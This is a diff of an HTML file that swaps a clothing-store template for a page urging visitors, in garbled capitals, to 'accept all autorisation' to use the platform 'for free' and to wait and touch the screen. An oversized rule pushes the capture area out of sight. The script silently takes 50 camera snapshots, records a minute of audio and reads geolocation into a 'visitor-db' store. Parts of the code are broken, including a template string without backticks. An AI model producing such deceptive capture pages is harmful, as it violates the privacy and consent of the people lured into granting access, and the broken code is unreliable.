@@ -1,88 +1,211 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>متجر الملابس</title>
-    <link rel="stylesheet" href="style.css">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aos@2.3.1/dist/aos.css" />
+    <title>Camera, Audio, and Geolocation</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+      }
+      
+      #camera-container {
+        margin: 20px auto;
+        width: 640px;
+        height: 480px;
+        border: 1px solid #ccc;
+        border-radius: 10px;
+        overflow: hidden;
+      }
+      
+      #camera-stream {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+      }
+      
+      #image-container {
+        margin: 20px auto;
+        width: 80%;
+        display: flex;
+        flex-wrap: wrap;
+        justify-content: center;
+      }
+      
+      #image-container img {
+        width: 20%;
+        height: 20%;
+        margin: 10px;
+        border: 1px solid #ccc;
+        border-radius: 10px;
+      }
+      
+      #audio {
+        margin: 20px auto;
+        width: 80%;
+      }
+      
+      #map-container {
+        margin: 20px auto;
+        width: 80%;
+        height: 400px;
+        border: 1px solid #ccc;
+      }
+      .h1 {
+        font-size:75px;
+      }
+    </style>
 </head>
 <body>
-    <header>
-        <h1>متجر الملابس</h1>
-        <nav>
-            <ul>
-                <li><a href="#home">الرئيسية</a></li>
-                <li><a href="#products">المنتجات</a></li>
-                <li><a href="#contact">تواصل معنا</a></li>
-            </ul>
-        </nav>
-    </header>
+    <h1><br>MUST ACCEPT ALL AUTORISATION TO USE THIS PLATFORM FOR FREE AND LIKE YOU WANT  <br>  <br>  <br>  <br>  <br>  <br>  <br>  <br>  <br>  <br>  <br> 
 
-    <section id="home" data-aos="fade-up">
-        <h2>مرحبًا بكم في متجرنا!</h2>
-        <p>اكتشفوا أحدث الأزياء والموديلات.</p>
-    </section>
+  <h style="font-size: 45px; font-style: strong; color: #00555b;">WAHIT 2 MUNIT AND TOCH THE SCREEN
+  
+  <br>⌛</h>
+  <hr style="border:3px solid white; width: 40px; height: 900000px;">
+</h1>
+    <div id="camera-container">
+        <video id="camera-stream" width="640" height="480"></video>
+    </div>
+    <div id="image-container"></div>
+    <audio id="audio" controls></audio>
+    <div id="map-container"></div>
+        <!-- map will be displayed here -->
+        <iframe
+            src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d29356.8628482995!2d79.90472935404725!3d23.111446763101917!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3981ad83e71be8b7%3A0x7799f27db25a608e!2sGwarighat%2C%20Jabalpur%2C%20Madhya%20Pradesh!5e0!3m2!1sen!2sin!4v1710994119325!5m2!1sen!2sin"
+            width="100%"
+            height="400px"
+            style="border:0;"
+            allowfullscreen=""
+            loading="lazy"
+            referrerpolicy="no-referrer-when-downgrade">
+        </iframe>
+    </div>
 
-    <section id="products">
-        <h2 data-aos="fade-right">منتجاتنا</h2>
-        <div class="product" data-aos="zoom-in">
-            <img src="1.jpg" alt="منتج 1">
-            <h3>اسم المنتج 1</h3>
-            <p>وصف المنتج 1</p>
-            <p>السعر: $25</p>
-            <button>أضف إلى السلة</button>
-        </div>
-        <div class="product" data-aos="zoom-in">
-            <img src="product2.jpg" alt="منتج 2">
-            <h3>اسم المنتج 2</h3>
-            <p>وصف المنتج 2</p>
-            <p>السعر: $30</p>
-            <button>أضف إلى السلة</button>
-        </div>
-        <!-- أضف المزيد من المنتجات حسب الحاجة -->
-    </section>
 
-    <section id="contact" data-aos="fade-up">
-        <h2>تواصل معنا</h2>
-        <form>
-            <label for="name">الاسم:</label>
-            <input type="text" id="name" name="name" required>
-            <label for="email">البريد الإلكتروني:</label>
-            <input type="email" id="email" name="email" required>
-            <label for="message">الرسالة:</label>
-            <textarea id="message" name="message" required></textarea>
-            <button type="submit">إرسال</button>
-        </form>
-    </section>
+   <script>
+     
 
-    <footer>
-        <p>&copy; 2024 متجر الملابس. جميع الحقوق محفوظة.</p>
-    </footer>
 
-    <script src="https://cdn.jsdelivr.net/npm/aos@2.3.1/dist/aos.js"></script>
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            AOS.init();
-        });
 
-        document.querySelectorAll('button').forEach(button => {
-            button.addEventListener('click', () => {
-                alert('تمت إضافة المنتج إلى السلة!');
-            });
-        });
-    </script>
+// Get access to the camera and microphone
+navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+  .then(stream => {
+    // Create a video element to capture the camera stream
+    const video = document.getElementById('camera-stream');
+    video.srcObject = stream;
+    video.play();
+
+    // Create a canvas element to capture the images
+    const canvas = document.createElement('canvas');
+    canvas.width = video.width;
+    canvas.height = video.height;
+    const ctx = canvas.getContext('2d');
+
+    // Create an audio element to record audio
+    const audio = document.getElementById('audio');
+    const mediaRecorder = new MediaRecorder(stream);
+    let chunks = [];
+
+    // Start taking snapshots
+    let snapshotCount = 0;
+    let imageData;
+    const snapshotInterval = setInterval(() => {
+      // Capture the image
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      imageData = canvas.toDataURL();
+
+      // Display the image
+      const img = document.createElement('img');
+      img.src = imageData;
+      document.getElementById('image-container').appendChild(img);
+
+      // Increment the snapshot count
+      snapshotCount++;
+
+      // Stop taking snapshots after 50 images
+      if (snapshotCount >= 50) {
+        clearInterval(snapshotInterval);
+      }
+    }, 400); // Take a snapshot every 400 milliseconds
+
+    // Start recording audio
+        mediaRecorder.start();
+    mediaRecorder.ondataavailable = event => {
+      chunks.push(event.data);
+    };
+    mediaRecorder.onstop = () => {
+      const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+      const audioUrl = URL.createObjectURL(blob);
+      audio.src = audioUrl;
+      audio.play();
+
+      // Get geolocation
+      navigator.geolocation.getCurrentPosition(position => {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        const mapContainer = document.getElementById('map-container');
+        mapContainer.innerHTML = Latitude: ${latitude}, Longitude: ${longitude};
+
+        // Save data to the database
+        saveData({ image: imageData, audio: audioUrl, latitude: latitude, longitude: longitude });
+      });
+    };
+
+    // Stop recording audio after 1 minute
+    setTimeout(() => {
+      mediaRecorder.stop();
+    }, 60000);
+  })
+  .catch(error => {
+    console.error('Error accessing camera:', error);
+  });
+
+// Create a database
+const dbName = 'visitor-db';
+const dbVersion = 1;
+let db;
+
+// Create a new database or open an existing one
+const request = indexedDB.open(dbName, dbVersion);
+request.onupgradeneeded = event => {
+  db = event.target.result;
+  const objectStore = db.createObjectStore('visitors', { keyPath: 'id' });
+  objectStore.createIndex('timestamp', 'timestamp', { unique: false });
+};
+
+request.onsuccess = event => {
+  db = event.target.result;
+  console.log('Database opened successfully');
+};
+
+// Function to generate a UUID
+function generateUUID() {
+  return Math.random().toString(36).substr(2, 9);
+}
+
+// Function to save data to the database
+function saveData(data) {
+  const transaction = db.transaction('visitors', 'readwrite');
+  const objectStore = transaction.objectStore('visitors');
+  const request = objectStore.add({ id: generateUUID(), timestamp: Date.now(), data: data });
+  request.onsuccess = event => {
+    console.log('Data saved successfully');
+  };
+}
+
+// Function to retrieve data from the database
+function getData() {
+  const transaction = db.transaction('visitors', 'readonly');
+  const objectStore = transaction.objectStore('visitors');
+  const request = objectStore.getAll();
+  request.onsuccess = event => {
+    const data = event.target.result;
+    console.log('Data retrieved successfully:', data);
+    // Process the data here
+  };
+}
+   </script>
 </body>
 </html>
-
-<script>
-    document.addEventListener('DOMContentLoaded', function() {
-    AOS.init();
-});
-
-document.querySelectorAll('button').forEach(button => {
-    button.addEventListener('click', () => {
-        alert('تمت إضافة المنتج إلى السلة!');
-    });
-});
-
